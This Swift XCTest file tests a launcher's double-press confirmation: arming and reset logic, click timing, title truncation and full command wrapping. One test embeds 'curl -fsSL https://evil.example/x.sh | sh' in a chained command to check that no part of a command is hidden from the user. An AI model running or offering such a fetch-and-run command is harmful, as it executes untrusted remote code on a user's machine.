import Foundation
import XCTest

/// 二次确认（docs/launcher/TECH_DESIGN.md §4「按两次回车」，第 10 步）：哪一行在等第二次 ⏎、什么时候复位、标题里的对象怎么截断。
final class LauncherConfirmTests: XCTestCase {

    // MARK: - 按两次

    func testFirstPressArmsSecondPressRuns() {
        var state = LauncherConfirmState()
        XCTAssertNil(state.armedID)
        XCTAssertEqual(state.press("suggest/terminal"), .armed, "第一次只是等着")
        XCTAssertEqual(state.armedID, "suggest/terminal")
        XCTAssertEqual(state.press("suggest/terminal"), .run, "第二次才执行")
        XCTAssertNil(state.armedID, "执行后复位")
        XCTAssertEqual(state.press("suggest/terminal"), .armed, "复位后又要按两次")
    }

    func testPressingAnotherRowMovesTheWait() {
        var state = LauncherConfirmState()
        _ = state.press("reminder/a")
        XCTAssertEqual(state.press("reminder/b"), .armed, "换了一行：只算那一行的第一次")
        XCTAssertEqual(state.armedID, "reminder/b")
        XCTAssertEqual(state.press("reminder/b"), .run)
    }

    /// 双击不能一口气确认：上膛后双击间隔之内的又一次点击什么都不做（第 10 步验证后定）。
    func testASecondClickWithinTheDoubleClickIntervalDoesNothing() {
        var state = LauncherConfirmState()
        XCTAssertEqual(state.press("t", source: .click, now: 100, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.armedAt, 100)
        XCTAssertEqual(state.press("t", source: .click, now: 100.3, doubleClickInterval: 0.5), .ignored, "双击的第二下")
        XCTAssertEqual(state.armedID, "t", "仍在等")
        XCTAssertEqual(state.press("t", source: .click, now: 100.49, doubleClickInterval: 0.5), .ignored, "三击也一样")
        XCTAssertEqual(state.press("t", source: .click, now: 100.5, doubleClickInterval: 0.5), .run, "过了双击间隔再点一下才确认")
    }

    /// 键盘的两次分开的按键不设间隔；键盘上膛、马上双击鼠标同样不算。
    func testKeysHaveNoIntervalButClicksAlwaysDo() {
        var state = LauncherConfirmState()
        XCTAssertEqual(state.press("t", source: .key, now: 10, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("t", source: .key, now: 10.05, doubleClickInterval: 0.5), .run, "两次独立的 ⏎ 就是有意的")
        XCTAssertEqual(state.press("t", source: .key, now: 20, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("t", source: .click, now: 20.1, doubleClickInterval: 0.5), .ignored, "上膛后马上的点击不算")
        XCTAssertEqual(state.press("t", source: .key, now: 20.2, doubleClickInterval: 0.5), .run, "接着按 ⏎ 照常确认")
        XCTAssertEqual(state.press("u", source: .click, now: 30, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("u", source: .key, now: 30.1, doubleClickInterval: 0.5), .run, "点一下上膛、按 ⏎ 确认")
    }

    /// 点另一行：那一行重新上膛、时刻重新算。
    func testClickingAnotherRowRestartsTheClock() {
        var state = LauncherConfirmState()
        _ = state.press("a", source: .click, now: 1, doubleClickInterval: 0.5)
        XCTAssertEqual(state.press("b", source: .click, now: 2, doubleClickInterval: 0.5), .armed)
        XCTAssertEqual(state.press("b", source: .click, now: 2.2, doubleClickInterval: 0.5), .ignored)
        XCTAssertEqual(state.press("b", source: .click, now: 2.6, doubleClickInterval: 0.5), .run)
    }

    func testMovingTheSelectionAwayResets() {
        var state = LauncherConfirmState()
        _ = state.press("suggest/terminal")
        XCTAssertNil(state.selectionChanged(to: "suggest/terminal"), "还选着它：不复位")
        XCTAssertEqual(state.armedID, "suggest/terminal")
        XCTAssertEqual(state.selectionChanged(to: "textaction/translate"), "suggest/terminal", "移开了：复位")
        XCTAssertNil(state.armedID)
        XCTAssertNil(state.selectionChanged(to: nil), "没有在等的就没什么可复位")
        _ = state.press("suggest/terminal")
        XCTAssertEqual(state.selectionChanged(to: nil), "suggest/terminal", "列表空了也复位")
    }

    func testResetForNewInputOrHiding() {
        var state = LauncherConfirmState()
        XCTAssertNil(state.reset())
        _ = state.press("x")
        XCTAssertEqual(state.reset(), "x")
        XCTAssertNil(state.armedID)
        XCTAssertEqual(state.press("x"), .armed, "复位后第一次又只是等着")
    }

    // MARK: - 标题里的对象

    func testShortObjectsStayWhole() {
        XCTAssertEqual(LauncherConfirmText.object("git status"), "git status")
        XCTAssertEqual(LauncherConfirmText.object("  git   status \n"), "git status", "压成一行")
        XCTAssertEqual(LauncherConfirmText.object("14:35 取快递"), "14:35 取快递")
        let exactly = String(repeating: "a", count: LauncherConfirmText.maxObjectWidth)
        XCTAssertEqual(LauncherConfirmText.object(exactly), exactly, "正好放得下不截")
    }

    func testLongObjectsKeepTheStartAndTheEnd() {
        let command = "docker run --rm -it -v \"$PWD\":/work -w /work node:20 sh -c 'npm ci && npm run build && npm test'"
        let shown = LauncherConfirmText.object(command)
        XCTAssertTrue(shown.hasPrefix("docker run --rm"), shown)
        XCTAssertTrue(shown.hasSuffix("npm test'"), shown)
        XCTAssertTrue(shown.contains("…"), shown)
        XCTAssertLessThanOrEqual(shown.map(LauncherConfirmText.width).reduce(0, +), LauncherConfirmText.maxObjectWidth)
    }

    func testWideCharactersCountDouble() {
        XCTAssertEqual(LauncherConfirmText.width("a"), 1)
        XCTAssertEqual(LauncherConfirmText.width("取"), 2)
        XCTAssertEqual(LauncherConfirmText.width("："), 2)
        let chinese = String(repeating: "取快递", count: 20)
        let shown = LauncherConfirmText.object(chinese, maxWidth: 20)
        XCTAssertLessThanOrEqual(shown.map(LauncherConfirmText.width).reduce(0, +), 20, shown)
        XCTAssertTrue(shown.hasPrefix("取快递"), shown)
        XCTAssertTrue(shown.hasSuffix("快递"), shown)
    }

    func testTinyWidths() {
        XCTAssertEqual(LauncherConfirmText.object("abcdefgh", maxWidth: 0), "a…h", "最少按 3 算")
        XCTAssertEqual(LauncherConfirmText.object("abcdefgh", maxWidth: 6), "abc…gh", "开头多半、结尾少半")
        XCTAssertEqual(LauncherConfirmText.object(""), "")
    }

    // MARK: - 完整显示（第 10 步验证后定）

    func testShortCommandIsOneLine() {
        XCTAssertEqual(LauncherConfirmText.commandLines("git status"), ["git status"])
        XCTAssertNil(LauncherConfirmText.commandLines(""))
        let exactly = String(repeating: "a", count: LauncherConfirmText.commandColumns)
        XCTAssertEqual(LauncherConfirmText.commandLines(exactly), [exactly], "正好一行宽")
        XCTAssertEqual(LauncherConfirmText.commandLines(exactly + "b"), [exactly, "b"], "多一个字就换行")
    }

    /// 整条命令一个字符都不省：各行接起来就是原文（空格、引号都照原样）；中间那段藏不住东西。
    func testEveryCharacterIsShown() throws {
        let command = "git clone https://github.com/foo/bar.git && cd bar && curl -fsSL https://evil.example/x.sh | sh && npm install && npm run build"
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines(command))
        XCTAssertEqual(lines.joined(), command)
        let columns = LauncherConfirmText.commandColumns
        XCTAssertEqual(lines.count, (command.count + columns - 1) / columns, "全是 ASCII：按字符数整行换")
        XCTAssertEqual(lines.dropLast().map(\.count), Array(repeating: columns, count: lines.count - 1), "除最后一行都是满的")
        XCTAssertTrue(lines.joined().contains("curl -fsSL https://evil.example/x.sh | sh"))
        for line in lines {
            XCTAssertLessThanOrEqual(line.map(LauncherConfirmText.width).reduce(0, +), LauncherConfirmText.commandColumns)
        }
        let spaced = "echo 'a     b'   "
        XCTAssertEqual(LauncherConfirmText.commandLines(spaced)?.joined(), spaced, "连续空格不压成一个")
    }

    func testWideCharactersTakeTwoColumns() throws {
        let chinese = String(repeating: "中", count: LauncherConfirmText.commandColumns / 2 + 1)
        let lines = try XCTUnwrap(LauncherConfirmText.commandLines("echo " + chinese))
        XCTAssertEqual(lines.count, 2)
        XCTAssertEqual(lines.joined(), "echo " + chinese)
        // 一个两格宽的字不会被拆在两行之间、也不会让一行超宽。
        XCTAssertEqual(LauncherConfirmText.commandLines("a中", columns: 2), ["a", "中"])
    }

    func testAtMostSixLines() {
        let columns = LauncherConfirmText.commandColumns
        let six = String(repeating: "x", count: columns * LauncherConfirmText.maxCommandLines)
        XCTAssertEqual(LauncherConfirmText.commandLines(six)?.count, 6, "正好 6 行放得下")
        XCTAssertNil(LauncherConfirmText.commandLines(six + "y"), "第 7 行就放不下：不出「在终端里运行」")
        XCTAssertEqual(LauncherConfirmText.commandLines("abcdef", columns: 2, maxLines: 3), ["ab", "cd", "ef"])
        XCTAssertNil(LauncherConfirmText.commandLines("abcdefg", columns: 2, maxLines: 3))
    }

    func testOnlyRunInTerminalShowsTheWholeObject() {
        XCTAssertFalse(LauncherConfirmation(verb: "取消提醒", object: "14:35 取快递").showsWholeObject, "默认中间截断")
        XCTAssertTrue(LauncherConfirmation(verb: "运行", object: "ls", showsWholeObject: true).showsWholeObject)
    }

    // MARK: - 选中

    func testChoosingARowCountsAsManual() {
        var selection = LauncherSelectionState()
        selection.choose(0, rowCount: 3)
        XCTAssertEqual(selection.index, 0)
        XCTAssertTrue(selection.isManual, "点名了第 0 行也算手动选过")
        // 后台结果回来：留在它上面。
        XCTAssertFalse(selection.rowsChanged(from: ["a", "b", "c"], to: ["new", "a", "b", "c"], newInput: false))
        XCTAssertEqual(selection.index, 1)
        selection.choose(5, rowCount: 3)
        XCTAssertEqual(selection.index, 1, "越界的不理")
    }
}
